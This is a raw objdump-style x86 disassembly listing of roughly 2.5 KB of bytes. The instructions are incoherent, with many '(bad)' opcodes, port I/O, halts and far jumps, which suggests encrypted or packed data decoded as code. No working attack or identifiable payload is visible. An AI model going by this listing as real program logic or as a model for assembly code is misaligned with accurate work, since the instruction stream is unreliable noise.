  417e6d:	add    ah,ah
  417e6f:	das    
  417e70:	push   ss
  417e71:	mov    dl,0xf4
  417e73:	xchg   edi,eax
  417e74:	aas    
  417e75:	inc    ebp
  417e76:	or     DWORD PTR [esi-0x44588279],esi
  417e7c:	imul   ebx,DWORD PTR [ebx-0x1924763c],0x17
  417e83:	cmp    edi,0xffffffa5
  417e86:	sbb    ch,BYTE PTR ds:0xbb96d66
  417e8c:	adc    bl,BYTE PTR [ebx+esi*8+0x1990ff3b]
  417e93:	sub    dh,BYTE PTR [eax]
  417e95:	cli    
  417e96:	adc    edi,DWORD PTR [esp+edx*2-0x7f]
  417e9a:	jo     0x417efd
  417e9c:	(bad)  
  417e9d:	loope  0x417f13
  417e9f:	shl    DWORD PTR [edi],0x6b
  417ea2:	out    dx,eax
  417ea3:	imul   ebp,esi,0x67
  417ea6:	pop    ss
  417ea7:	daa    
  417ea8:	out    dx,eax
  417ea9:	xchg   esp,eax
  417eaa:	pop    ecx
  417eab:	ins    DWORD PTR es:[edi],dx
  417eac:	pop    esi
  417ead:	ins    BYTE PTR es:[edi],dx
  417eae:	adc    al,0xc
  417eb0:	cli    
  417eb1:	pop    edx
  417eb2:	xor    DWORD PTR [esi-0x4fb680f7],ebx
  417eb8:	and    BYTE PTR [edi+ecx*1+0x50],ch
  417ebc:	pop    esi
  417ebd:	dec    edi
  417ebe:	push   0x11018b2d
  417ec3:	out    dx,al
  417ec4:	fisub  DWORD PTR [ecx]
  417ec6:	inc    ecx
  417ec7:	in     eax,0x46
  417ec9:	xchg   edx,eax
  417eca:	pop    edi
  417ecb:	mov    ecx,0xbc2bac12
  417ed0:	pushf  
  417ed1:	int3   
  417ed2:	mov    bl,0x85
  417ed4:	repnz or cl,BYTE PTR [ebx]
  417ed7:	icebp  
  417ed8:	hlt    
  417ed9:	inc    ecx
  417eda:	loop   0x417f05
  417edc:	pop    edx
  417edd:	dec    DWORD PTR [ecx-0x6f4afa5b]
  417ee3:	hlt    
  417ee4:	mov    ebp,0x5e24eba6
  417ee9:	test   BYTE PTR [esi],0x96
  417eec:	jl     0x417ee1
  417eee:	add    al,0x2f
  417ef0:	mov    dl,dh
  417ef2:	sahf   
  417ef3:	sub    DWORD PTR [esi+ebp*1],edx
  417ef6:	int3   
  417ef7:	add    eax,ebp
  417ef9:	push   0xb9e74eeb
  417efe:	in     al,0xff
  417f00:	xchg   ecx,eax
  417f01:	shl    BYTE PTR [ecx],cl
  417f03:	(bad)  [eax-0x41aeade9]
  417f09:	pop    edx
  417f0a:	das    
  417f0b:	je     0x417ea9
  417f0d:	fimul  WORD PTR [eax+eiz*2+0x6d]
  417f11:	sbb    edi,DWORD PTR [ebx+0x38]
  417f14:	lea    ecx,[esi-0x36a5db09]
  417f1a:	mov    WORD PTR [ebx],?
  417f1c:	or     dh,BYTE PTR [edx+ebx*4]
  417f1f:	shl    BYTE PTR [ebx+0x671d9975],0xaa
  417f26:	hlt    
  417f27:	(bad)  
  417f28:	cli    
  417f29:	loop   0x417f65
  417f2b:	xor    eax,0x7a2dbce4
  417f30:	fwait
  417f31:	test   DWORD PTR [edi+0x61],0x283e8b7e
  417f38:	sbb    eax,DWORD PTR [ecx]
  417f3a:	jge    0x417ec0
  417f3c:	les    eax,FWORD PTR [ebp+0x4d]
  417f3f:	push   cs
  417f40:	sti    
  417f41:	cmc    
  417f42:	push   0xa69dce34
  417f47:	mov    eax,ds:0x5ad1d406
  417f4c:	dec    edi
  417f4d:	jmp    0x417ed9
  417f4f:	arpl   bx,ax
  417f51:	(bad)  
  417f52:	aas    
  417f53:	push   cs
  417f54:	xor    BYTE PTR [ebx],bl
  417f56:	sub    ebx,ebp
  417f58:	xchg   ebx,eax
  417f59:	xchg   dh,dh
  417f5b:	imul   esp,esi,0x37
  417f5e:	in     eax,dx
  417f5f:	test   BYTE PTR [edi+ebp*1+0x5103e341],0x68
  417f67:	enter  0xa734,0x8e
  417f6b:	arpl   WORD PTR [ebx],di
  417f6d:	dec    ebp
	...
  417fd6:	(bad)  
  417fd7:	out    0xe6,al
  417fd9:	cmp    esp,esi
  417fdb:	cmp    edi,edi
  417fdd:	push   DWORD PTR [edx]
  417fdf:	xchg   edx,eax
  417fe0:	xor    al,bh
  417fe2:	push   ebx
  417fe3:	adc    edi,eax
  417fe5:	or     esp,DWORD PTR [edi+0x2]
  417fe8:	add    DWORD PTR [eax],eax
  417fea:	add    BYTE PTR [ecx],al
  417fec:	add    BYTE PTR [eax],al
  417fee:	and    DWORD PTR [edi],edx
  417ff0:	gs (bad) 
  417ff2:	dec    ebp
  417ff3:	cmp    BYTE PTR [ecx],ch
  417ff5:	push   0xa38c22a0
  417ffa:	gs icebp 
  417ffc:	pop    eax
  417ffd:	hlt    
  417ffe:	cwde   
  417fff:	xchg   ebx,eax
  418000:	jg     0x418054
  418002:	ficomp DWORD PTR [edi-0x12]
  418005:	mov    ah,0xc2
  418007:	fst    QWORD PTR [edx+eax*2-0x524bb7c]
  41800e:	fnop   
  418010:	fwait
  418011:	or     esp,DWORD PTR [ebp+0x5fc5621b]
  418017:	push   ds
  418018:	cli    
  418019:	cwde   
  41801a:	mov    ds:0x3c34d066,eax
  41801f:	fcomi  st,st(2)
  418021:	cmp    al,0x8d
  418023:	add    DWORD PTR [ebx],0x47615586
  418029:	cmp    BYTE PTR [eax],bh
  41802b:	xor    DWORD PTR [ecx-0x17],edi
  41802e:	add    eax,0xe2656486
  418033:	icebp  
  418034:	ss out dx,al
  418036:	xchg   edx,eax
  418037:	add    DWORD PTR [ecx+0x31c3dd05],ebx
  41803d:	push   ebx
  41803e:	rcr    BYTE PTR [ecx+0x48],0xdb
  418042:	cs pop ebx
  418044:	lock or BYTE PTR [edx],al
  418047:	jmp    0xa27d5f1b
  41804c:	(bad)  
  41804d:	lea    edx,[edi-0x69]
  418050:	dec    esp
  418051:	adc    ebx,eax
  418053:	into   
  418054:	mov    ah,0xad
  418056:	xlat   BYTE PTR ds:[ebx]
  418057:	push   ebp
  418058:	or     edx,DWORD PTR [edx-0x5d9998a5]
  41805e:	ja     0x418013
  418060:	jno    0x41807b
  418062:	and    BYTE PTR [edi+0x68],cl
  418065:	out    dx,al
  418066:	jmp    0x4180b3
  418068:	sub    al,0x54
  41806a:	cmp    BYTE PTR [ebx-0x4603d33a],bl
  418070:	or     esi,eax
  418072:	out    dx,eax
  418073:	jmp    0xe824b0ba
  418078:	sub    DWORD PTR [edx-0x28],0x6ddb8c2e
  41807f:	sbb    eax,0x6fcee24a
  418084:	into   
  418085:	sbb    al,0xb
  418087:	xchg   ecx,eax
  418088:	test   BYTE PTR [esi],bl
  41808a:	or     DWORD PTR [eax-0x64],edx
  41808d:	loope  0x418100
  41808f:	hlt    
  418090:	jecxz  0x4180e7
  418092:	and    eax,0x3e73191b
  418097:	mov    bl,0xc6
  418099:	or     DWORD PTR [ebp-0x5d7a5772],ecx
  41809f:	jp     0x4180cb
  4180a1:	inc    eax
  4180a2:	loope  0x41807d
  4180a4:	mov    al,0x49
  4180a6:	fnsave [ecx-0x6669b1bc]
  4180ac:	fistp  WORD PTR [ebp-0x1a]
  4180af:	sbb    eax,0xaf1cf771
  4180b4:	sub    DWORD PTR [edx-0x2dbb7e2d],ecx
  4180ba:	scas   eax,DWORD PTR es:[edi]
  4180bb:	dec    ebp
  4180bc:	les    ebx,FWORD PTR [eax-0x3c]
  4180bf:	push   edx
  4180c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180c1:	push   edx
  4180c2:	scas   al,BYTE PTR es:[edi]
  4180c3:	(bad)  
  4180c6:	call   0xe0c6:0x33c45faf
  4180cd:	add    DWORD PTR [ecx],edi
  4180cf:	lods   eax,DWORD PTR ds:[esi]
  4180d0:	ret    
  4180d1:	pusha  
  4180d2:	cmp    DWORD PTR [eax-0x17691e8d],edi
  4180d8:	sbb    DWORD PTR [edi+ecx*2+0x5acd0556],ecx
  4180df:	or     edi,esp
  4180e1:	shl    BYTE PTR [edi+0x32b7ef37],0x70
  4180e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180e9:	xchg   ebp,eax
  4180ea:	in     al,dx
  4180eb:	outs   dx,DWORD PTR ds:[esi]
  4180ec:	jmp    0x4180a5
	...
  418156:	test   eax,0xff456b7e
  41815b:	push   ebp
  41815c:	scas   eax,DWORD PTR es:[edi]
  41815d:	(bad)  
  41815e:	mov    ds:0x802fdebc,eax
  418163:	js     0x418123
  418165:	popf   
  418166:	add    eax,DWORD PTR [bx+di]
  418169:	add    BYTE PTR [eax],al
  41816b:	add    DWORD PTR [eax],eax
  41816d:	add    BYTE PTR [esi+0x1a],cl
  418170:	test   bh,dh
  418172:	xlat   BYTE PTR ds:[ebx]
  418173:	and    esi,DWORD PTR [esi+ecx*4-0x14]
  418177:	mov    al,ds:0x22c28fe2
  41817c:	mov    edi,0xf5d71ee2
  418181:	sub    edx,edx
  418183:	loopne 0x418111
  418185:	adc    eax,0xa60a3ba2
  41818a:	mov    esp,0x13490320
  41818f:	lock pop ss
  418191:	push   0xe6bf6257
  418196:	(bad)  
  418197:	mov    al,0x2
  418199:	ja     0x4181f9
  41819b:	xchg   ebx,eax
  41819c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41819d:	mov    dh,0xdd
  41819f:	inc    esi
  4181a0:	fdivr  st(0),st
  4181a2:	jo     0x4181a5
  4181a4:	and    dh,BYTE PTR [edx]
  4181a6:	sub    eax,0xc75cc37c
  4181ab:	inc    edx
  4181ac:	enter  0x8f73,0x73
  4181b0:	jl     0x418153
  4181b2:	jno    0x418139
  4181b4:	mov    esp,0xc46712a6
  4181b9:	ins    DWORD PTR es:[edi],dx
  4181ba:	je     0x418239
  4181bc:	cmp    bl,cl
  4181be:	lds    ebx,FWORD PTR [ebp-0x6c]
  4181c1:	aam    0x7e
  4181c3:	cmp    BYTE PTR [eax],0xe2
  4181c6:	fs je  0x4181f2
  4181c9:	iret   
  4181ca:	ret    0x4eaf
  4181cd:	aam    0x3f
  4181cf:	sbb    esp,DWORD PTR [edi+eax*8-0x2d]
  4181d3:	inc    ebx
  4181d4:	pop    esp
  4181d5:	cmp    BYTE PTR [eax+0x11c07c21],dl
  4181db:	jle    0x4181d0
  4181dd:	aad    0x48
  4181df:	nop
  4181e0:	(bad)  
  4181e1:	push   edx
  4181e2:	arpl   WORD PTR [edi],bx
  4181e4:	sbb    edi,DWORD PTR [ecx]
  4181e6:	aas    
  4181e7:	(bad)  
  4181e8:	fcomp  QWORD PTR [ebp+ebp*1+0x78]
  4181ec:	jne    0x4181f2
  4181ee:	rcr    cl,1
  4181f0:	dec    esi
  4181f1:	push   edx
  4181f2:	pmulhw mm6,QWORD PTR [ebx+esi*4-0x2c]
  4181f7:	mov    gs,WORD PTR [ebp+0xfb73a19]
  4181fd:	mov    bl,0x98
  4181ff:	outs   dx,DWORD PTR ds:[esi]
  418200:	rep lods eax,DWORD PTR ds:[esi]
  418202:	pop    ss
  418203:	out    dx,al
  418204:	xchg   ecx,eax
  418205:	pop    edx
  418206:	mov    esi,0x5c07edde
  41820b:	shl    esi,cl
  41820d:	dec    esp
  41820e:	nop
  41820f:	mov    bh,0xf2
  418211:	sahf   
  418212:	mov    ah,0x33
  418214:	jge    0x418231
  418216:	je     0x41825e
  418218:	jge    0x418253
  41821a:	frstor [edx*2+0x1895a5c7]
  418221:	lods   eax,DWORD PTR ds:[esi]
  418222:	sar    DWORD PTR [esi],1
  418224:	(bad)  
  418225:	nop
  418226:	pop    edi
  418227:	mov    DWORD PTR [eax+0x17],0x167188c6
  41822e:	mov    DWORD PTR [eax+0x58a81633],edx
  418234:	stos   DWORD PTR es:[edi],eax
  418235:	outs   dx,BYTE PTR ds:[esi]
  418236:	push   edx
  418237:	sahf   
  418238:	xchg   esp,eax
  418239:	call   0xbb9bc4ba
  41823e:	add    DWORD PTR [ecx+eax*2+0x13b19765],edx
  418245:	sti    
  418246:	mov    WORD PTR [eax+0x27],es
  418249:	pop    ss
  41824a:	stos   DWORD PTR es:[edi],eax
  41824b:	dec    ebp
  41824c:	inc    ebx
  41824d:	fnstenv [esi+eiz*1+0xc]
  418251:	jno    0x41822d
  418253:	out    dx,eax
  418254:	and    dh,ch
  418256:	jp     0x41827e
  418258:	pop    ds
  418259:	or     dl,BYTE PTR [ebx-0x66]
  41825c:	shl    BYTE PTR [esi-0x3f],1
  41825f:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418261:	into   
  418262:	and    al,0x51
  418264:	cmp    ebx,edx
  418266:	hlt    
  418267:	add    ebp,DWORD PTR [edx+0x2be74333]
  41826d:	push   ebx
	...
  4182d6:	aaa    
  4182d7:	xchg   edx,eax
  4182d8:	and    al,0x83
  4182da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182db:	mov    bh,0xb7
  4182dd:	mov    dh,0x40
  4182df:	mov    ebx,0x7309b8d6
  4182e4:	shl    DWORD PTR ds:[edi+0x4],cl
  4182e8:	add    DWORD PTR [eax],eax
  4182ea:	add    BYTE PTR [ecx],al
  4182ec:	add    BYTE PTR [eax],al
  4182ee:	retf   
  4182ef:	sub    ecx,ebp
  4182f1:	shl    DWORD PTR [esi+ecx*8+0x3560bdcf],1
  4182f8:	inc    esi
  4182f9:	mov    ecx,0xf9d5c9a
  4182fe:	sub    eax,0xdc1c6da4
  418303:	jnp    0x41832d
  418305:	mov    al,ds:0xc9908814
  41830a:	jp     0x4182dd
  41830c:	dec    edx
  41830d:	push   eax
  41830e:	aas    
  41830f:	mov    cl,0x49
  418311:	xor    eax,0x562b891f
  418316:	cld    
  418317:	sub    eax,DWORD PTR [ebx+0x24]
  41831a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41831b:	and    eax,0xf75f5d8c
  418320:	fsubr  DWORD PTR [esp+edi*8-0x49]
  418324:	xchg   edi,eax
  418325:	and    BYTE PTR [esi],0x24
  418328:	cmp    DWORD PTR [ebx-0x4f],0xffffffb5
  41832c:	cmp    ah,dh
  41832e:	shl    DWORD PTR [ecx],1
  418330:	fdiv   st,st(5)
  418333:	mov    edx,DWORD PTR [ebp+0xd]
  418336:	ret    
  418337:	sub    BYTE PTR [ecx],ch
  418339:	jb     0x41833e
  41833b:	pop    es
  41833c:	outs   dx,DWORD PTR ds:[esi]
  41833d:	dec    esp
  41833e:	mov    eax,0x661174e5
  418343:	mov    esp,0x9310826c
  418348:	ret    
  418349:	out    dx,eax
  41834a:	ficomp WORD PTR [ebp-0x6bf13a70]
  418350:	lea    edx,[esi-0x1ca4598d]
  418356:	fiadd  WORD PTR [ebx+0x75]
  418359:	cdq    
  41835a:	sub    edx,ebx
  41835c:	mov    edx,0x7cc0f46d
  418361:	cmp    BYTE PTR [esp+ecx*4+0x1a],cl
  418365:	test   al,0x17
  418367:	fistp  DWORD PTR [ebp-0x767a7174]
  41836d:	rol    DWORD PTR [edx],0x89
  418370:	xchg   ah,ch
  418372:	mov    edi,0x396837a7
  418377:	es inc esp
  418379:	(bad)  
  41837b:	(bad)  
  41837c:	sub    eax,0x277be10e
  418381:	pop    esp
  418382:	mov    DWORD PTR [esi],edi
  418384:	dec    esi
  418385:	xchg   esi,eax
  418386:	cld    
  418387:	ins    BYTE PTR es:[edi],dx
  418388:	pusha  
  418389:	dec    edi
  41838a:	cmp    BYTE PTR [edx-0x401bf069],0xcf
  418391:	mov    eax,ds:0x39567653
  418396:	(bad)  
  418397:	xor    eax,0xbd683ea
  41839c:	fmul   DWORD PTR ds:0x53db1dd0
  4183a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183a3:	push   eax
  4183a4:	and    eax,0x5ec0542c
  4183a9:	mov    cl,0xf1
  4183ab:	xlat   BYTE PTR ds:[ebx]
  4183ac:	xchg   edi,eax
  4183ad:	out    dx,eax
  4183ae:	sub    al,0x6c
  4183b0:	ds jno 0x4183ee
  4183b3:	xor    ecx,0x18f7c5b1
  4183b9:	mov    fs,WORD PTR [edi+0x9]
  4183bc:	mov    ebp,0x77ff34bd
  4183c1:	xchg   ecx,eax
  4183c2:	mov    bh,0xb4
  4183c4:	pop    esp
  4183c5:	jp     0x41837f
  4183c7:	(bad)  
  4183c9:	(bad)  
  4183ca:	jae    0x4183ed
  4183cc:	inc    esp
  4183cd:	mov    dl,0xfd
  4183cf:	cld    
  4183d0:	or     DWORD PTR [esi],ecx
  4183d2:	pop    ebp
  4183d3:	inc    esp
  4183d4:	xchg   ecx,eax
  4183d5:	fs fmul st,st(1)
  4183d8:	xchg   ebx,eax
  4183d9:	mov    dl,0xe6
  4183db:	mov    al,0xd5
  4183dd:	ins    BYTE PTR es:[edi],dx
  4183de:	push   ebp
  4183df:	les    ebp,FWORD PTR [ebx+0x4e]
  4183e2:	jl     0x418411
  4183e4:	push   esi
  4183e5:	mov    edx,DWORD PTR [ebp+esi*4-0x27f368bb]
  4183ec:	call   0x0:0x2e
	...
  418453:	add    BYTE PTR [eax],al
  418455:	add    ah,bl
  418457:	mov    bl,0x3f
  418459:	push   eax
  41845a:	jg     0x418438
  41845c:	(bad)  
  41845d:	mov    edi,0x14d871ac
  418462:	jl     0x418403
  418464:	jecxz  0x41848b
  418466:	addr16 add eax,0x1000001
  41846c:	add    BYTE PTR [eax],al
  41846e:	dec    esp
  41846f:	lock enter 0x5834,0xef
  418474:	cs mov DWORD PTR fs:[ebx],edx
  418478:	xchg   edi,eax
  418479:	inc    ecx
  41847a:	retf   0x705e
  41847d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41847e:	sub    eax,0x5e0a8c1
  418483:	cmc    
  418484:	addr16 test al,0xf3
  418487:	lods   eax,DWORD PTR ds:[esi]
  418488:	pop    ss
  418489:	test   al,0xbe
  41848b:	add    ch,BYTE PTR [ecx-0x5c002c39]
  418491:	jns    0x4184c3
  418493:	adc    eax,0xeb228b4d
  418498:	sbb    ebp,ebx
  41849a:	imul   edi,DWORD PTR [edx],0xffffffef
  41849d:	ret    
  41849e:	das    
  41849f:	xchg   esp,eax
  4184a0:	rcr    bl,cl
  4184a2:	or     eax,0x4f73ab5d
  4184a7:	xor    al,0xbb
  4184a9:	dec    eax
  4184aa:	sbb    bh,al
  4184ac:	ja     0x41847e
  4184ae:	test   BYTE PTR [esi+0x41],dh
  4184b1:	(bad)  
  4184b2:	ftst   
  4184b4:	mov    dh,0xe0
  4184b6:	leave  
  4184b7:	call   0xc175:0x8f40dfb
  4184be:	(bad)
  4184c1:	mov    ds,ecx
  4184c3:	jecxz  0x418479
  4184c5:	aam    0x6b
  4184c7:	out    0xb1,eax
  4184c9:	inc    edi
  4184ca:	adc    al,0x6
  4184cc:	jno    0x4184b2
  4184ce:	and    dh,bl
  4184d0:	sub    eax,0xb3d47d51
  4184d5:	adc    al,0x47
  4184d7:	add    esp,DWORD PTR [eax-0x3]
  4184da:	shl    BYTE PTR [edi+0x28],cl
  4184dd:	mov    ebx,0x3fd1971d
  4184e2:	or     dl,cl
  4184e4:	xchg   edx,eax
  4184e5:	xchg   esp,eax
  4184e6:	and    DWORD PTR [ecx],edx
  4184e8:	sub    eax,0x918f9575
  4184ed:	test   eax,0x291bdb17
  4184f2:	jl     0x41848c
  4184f4:	push   DWORD PTR [ebp-0x7e]
  4184f7:	lods   eax,DWORD PTR ds:[esi]
  4184f8:	dec    esp
  4184f9:	push   ebp
  4184fa:	(bad)  
  4184fc:	xor    esp,esi
  4184fe:	pop    esp
  4184ff:	out    dx,eax
  418500:	es imul ebp,ebx,0x2b
  418504:	shr    esp,0xd2
  418507:	mov    dl,0x62
  418509:	pushf  
  41850a:	imul   esp,DWORD PTR ss:[esi],0x25
  41850e:	les    edx,FWORD PTR [ebp-0x2c0657f9]
  418514:	jo     0x418563
  418516:	(bad)  
  418517:	and    al,0x65
  418519:	jle    0x4184b1
  41851b:	mov    ebx,0x4947ab4
  418520:	jbe    0x418532
  418522:	stc    
  418523:	es or  eax,0x7f70d703
  418529:	mov    DWORD PTR [ecx],esp
  41852b:	fwait
  41852c:	mov    edi,0x66176574
  418531:	xor    DWORD PTR ss:0x862ad5d0,edi
  418538:	mov    ebx,0x32cb14ae
  41853d:	cmp    dl,bh
  41853f:	rcl    cl,cl
  418541:	(bad)  
  418542:	sub    bh,BYTE PTR [eax-0x5b96ba09]
  418548:	cwde   
  418549:	pop    edx
  41854a:	adc    DWORD PTR [ebx],edi
  41854c:	inc    edx
  41854d:	ror    ch,0xb
  418550:	jmp    0x94b5bf23
  418555:	mov    ecx,0x8b6dcbb1
  41855a:	mov    edi,0xe1b38e8b
  41855f:	add    al,BYTE PTR [ebx]
  418561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418562:	cmp    BYTE PTR [esi-0x52],cl
  418565:	pop    esp
  418566:	ds in  eax,dx
  418568:	into   
  418569:	icebp  
  41856a:	sbb    al,0x47
  41856c:	fmul   DWORD PTR [ecx+0x0]
	...
  4185d6:	inc    ecx
  4185d7:	stc    
  4185d8:	mov    ebx,ebx
  4185da:	mov    ebx,0x26fb51fb
  4185df:	lods   al,BYTE PTR ds:[esi]
  4185e0:	imul   dl
  4185e2:	scas   eax,DWORD PTR es:[edi]
  4185e3:	pushf  
  4185e4:	sbb    al,0xb5
  4185e6:	addr16 push es
  4185e8:	add    DWORD PTR [eax],eax
  4185ea:	add    BYTE PTR [ecx],al
  4185ec:	add    BYTE PTR [eax],al
  4185ee:	or     eax,0xadb2fbf1
  4185f3:	stos   DWORD PTR es:[edi],eax
  4185f4:	mov    ah,0xd7
  4185f6:	stos   BYTE PTR es:[edi],al
  4185f7:	jmp    0x7e461aef
  4185fc:	shl    DWORD PTR [edi-0x64],1
  4185ff:	pop    es
  418600:	call   0x58a8:0x993a3888
  418607:	push   es
  418608:	mov    bh,0xa4
  41860a:	shl    DWORD PTR [eax-0x41],0x1e
  41860e:	loope  0x418631
  418610:	sub    eax,0x169f1a6a
  418615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418616:	test   ebp,esi
  418618:	jae    0x418678
  41861a:	(bad)  
  41861b:	iret   
  41861c:	(bad)  
  41861d:	jle    0x4185ae
  41861f:	ins    BYTE PTR es:[edi],dx
  418620:	pop    esi
  418621:	mov    eax,0x506ac1ab
  418626:	(bad)  
  418627:	leave  
  418628:	lods   eax,DWORD PTR ds:[esi]
  418629:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41862a:	call   0xd946:0xa9447670
  418631:	cmc    
  418632:	lds    ecx,FWORD PTR [edi+esi*8+0x30d8ad1b]
  418639:	adc    eax,0x57c5df9d
  41863e:	cmp    dl,BYTE PTR [eax]
  418640:	xor    eax,0x3e0d0399
  418645:	push   ebp
  418646:	or     BYTE PTR [edx-0x1a],0x8a
  41864a:	mov    ds:0x4e832dc6,al
  41864f:	std    
  418650:	outs   dx,BYTE PTR ds:[esi]
  418651:	xchg   ebp,eax
  418652:	or     DWORD PTR [edi],eax
  418654:	test   al,0x8d
  418656:	push   edi
  418657:	xor    eax,0x91145a51
  41865c:	sbb    eax,0x6ad4fd93
  418661:	mov    dh,0xbd
  418663:	addr16 pop es
  418665:	mov    edx,0x92dbf7d3
  41866a:	or     DWORD PTR [edx+0x41],0xffffffcf
  41866e:	xor    ebx,DWORD PTR [esi]
  418670:	adc    edx,DWORD PTR ds:0x7e84ca45
  418676:	enter  0x2f30,0xb2
  41867a:	jo     0x4185fe
  41867c:	rcr    BYTE PTR [edx],1
  41867e:	push   eax
  41867f:	stos   BYTE PTR es:[edi],al
  418680:	and    cl,BYTE PTR [edi-0x6a268520]
  418686:	jmp    0x2fa9ead2
  41868b:	aas    
  41868c:	call   0x180:0x92e8dfa2
  418693:	xor    ah,BYTE PTR [esi]
  418695:	or     DWORD PTR [ebx+eax*1+0x13],esp
  418699:	push   esp
  41869a:	daa    
  41869b:	or     eax,0xc9e2837d
  4186a0:	dec    esp
  4186a1:	jnp    0x41863b
  4186a3:	and    DWORD PTR gs:[ebx+0x6c],ebx
  4186a7:	shr    BYTE PTR [ebx],0xbb
  4186aa:	jle    0x41869b
  4186ac:	ss rcl ah,0xdd
  4186b0:	std    
  4186b1:	in     eax,0x9f
  4186b3:	push   edi
  4186b4:	fcmovu st,st(5)
  4186b6:	push   edx
  4186b7:	xor    al,0xc7
  4186b9:	jecxz  0x4186ce
  4186bb:	retf   
  4186bc:	enter  0x300a,0x1f
  4186c0:	sar    BYTE PTR [edx+0x2651f558],0x1c
  4186c7:	adc    eax,0x77648d23
  4186cc:	in     al,dx
  4186cd:	pop    ebx
  4186ce:	add    eax,0x7f78502b
  4186d3:	aaa    
  4186d4:	inc    edx
  4186d5:	shl    DWORD PTR [edx-0x39edbf4b],1
  4186db:	mov    ebx,0x313d3790
  4186e0:	sahf   
  4186e1:	daa    
  4186e2:	xchg   edi,eax
  4186e3:	push   ss
  4186e4:	iret   
  4186e5:	(bad)  
  4186e7:	mov    edi,0x4f03b59b
  4186ec:	xchg   ebp,eax
  4186ed:	dec    ecx
	...
  418756:	xchg   ebx,eax
  418757:	sub    BYTE PTR [eax-0x604344c4],ah
  41875d:	scas   eax,DWORD PTR es:[edi]
  41875e:	or     al,0x8d
  418760:	cmp    edx,edx
  418762:	dec    eax
  418763:	add    ecx,0x1076749
  418769:	add    BYTE PTR [eax],al
  41876b:	add    DWORD PTR [eax],eax
  41876d:	add    BYTE PTR [eax],al
  41876f:	cli    
  418770:	xlat   BYTE PTR ds:[ebx]
  418771:	lods   eax,DWORD PTR ds:[esi]
  418772:	popa   
  418773:	push   esp
  418774:	(bad)  
  418775:	out    dx,eax
  418776:	shl    DWORD PTR [ecx],cl
  418778:	retf   0x3bbc
  41877b:	xchg   DWORD PTR [ebp+0x36],ecx
  41877e:	in     al,0x3c
  418780:	pop    ds
  418781:	inc    esp
  418782:	(bad)  [edi+edi*8+0x5f]
  418786:	cmp    edx,esp
  418788:	stos   BYTE PTR es:[edi],al
  418789:	ins    DWORD PTR es:[edi],dx
  41878a:	test   al,0xe2
  41878c:	stos   DWORD PTR es:[edi],eax
  41878d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41878e:	in     al,dx
  41878f:	xchg   DWORD PTR [ecx+0x675d13d3],ebx
  418795:	and    DWORD PTR [esi],ebx
  418797:	cwde   
  418798:	xchg   edx,eax
  418799:	pop    es
  41879a:	test   al,0x4a
  41879c:	call   0x4a6a:0xb64f246f
  4187a3:	in     al,0x5d
  4187a5:	shr    BYTE PTR [esi+0x60],1
  4187a8:	imul   edx,ebp,0x6e
  4187ab:	icebp  
  4187ac:	push   ss
  4187ad:	push   ecx
  4187ae:	shl    BYTE PTR [ecx],0x74
  4187b1:	push   edi
  4187b2:	pop    esi
  4187b3:	ss stos DWORD PTR es:[edi],eax
  4187b5:	mov    BYTE PTR [esi-0x20c40e36],0xef
  4187bc:	int3   
  4187bd:	push   cs
  4187be:	and    BYTE PTR [edi],ch
  4187c0:	mov    eax,0x4870ed86
  4187c5:	repnz popf 
  4187c7:	ret    0x316a
  4187ca:	ins    BYTE PTR es:[edi],dx
  4187cb:	(bad)  
  4187cc:	fucomi st,st(7)
  4187ce:	cs push esp
  4187d0:	out    dx,al
  4187d1:	push   esi
  4187d2:	adc    bl,BYTE PTR [ebx+0x44]
  4187d5:	fst    DWORD PTR [ebp+0x65]
  4187d8:	retf   0xb1b
  4187db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187dc:	add    DWORD PTR [eax-0x6278f3c1],edx
  4187e2:	popf   
  4187e3:	outs   dx,BYTE PTR ds:[esi]
  4187e4:	push   ebx
  4187e5:	cwde   
  4187e6:	daa    
  4187e7:	push   ecx
  4187e8:	push   edx
  4187e9:	outs   dx,DWORD PTR ds:[esi]
  4187ea:	mov    ss,WORD PTR [ebx-0x4d]
  4187ed:	cmp    al,0x2d
  4187ef:	dec    esp
  4187f0:	jae    0x4187be
  4187f2:	jg     0x4187aa
  4187f4:	mov    ecx,0x3f7c9764
  4187f9:	add    cl,BYTE PTR ss:[edx-0x3a]
  4187fd:	pop    ecx
  4187fe:	mov    eax,0xcb028782
  418803:	jmp    0x4187f4
  418805:	add    ch,BYTE PTR [esi-0x68]
  418808:	inc    edx
  418809:	pop    esp
  41880a:	push   edi
  41880b:	(bad)  
  41880c:	sbb    BYTE PTR [eax],al
  41880e:	add    al,0xb3
  418810:	leave  
  418811:	adc    al,0xca
  418813:	popf   
  418814:	test   DWORD PTR [edx-0x64e7c189],0x3d3f0259
  41881e:	add    dl,BYTE PTR [ebp+0x6e]
  418821:	(bad)  
  418822:	scas   eax,DWORD PTR es:[edi]
  418823:	xor    eax,0x8e8d7210
  418828:	xor    al,0x89
  41882a:	popf   
  41882b:	mov    DWORD PTR [eax],eax
  41882d:	add    al,0xaa
  41882f:	xchg   esp,eax
  418830:	out    0x2c,eax
  418832:	mov    ds:0x8be4f362,al
  418837:	pop    ss
  418838:	int    0xf8
  41883a:	sbb    al,0x2c
  41883c:	pop    esi
  41883d:	sub    ebp,DWORD PTR [edi+0x74]
  418840:	inc    esi
  418841:	std    
  418842:	sub    ecx,DWORD PTR [esi+0x5564e691]
  418848:	pop    edi
  418849:	aam    0x66
  41884b:	mov    ecx,0x16157d1b
  418850:	mov    bh,0xf3
  418852:	pop    ebx
  418853:	jnp    0x4188cc
  418855:	or     al,0x3c
  418857:	(bad)  
  418858:	jecxz  0x418854
  41885a:	mov    dx,0x4872
  41885e:	loop   0x418801
  418860:	out    dx,eax
  418861:	(bad)  
  418862:	jp     0x41887d
  418864:	and    eax,0x8ef3f547
  418869:	clc    
  41886a:	inc    ebx
  41886b:	loop   0x4188ea
  41886d:	mov    bl,0x0
	...
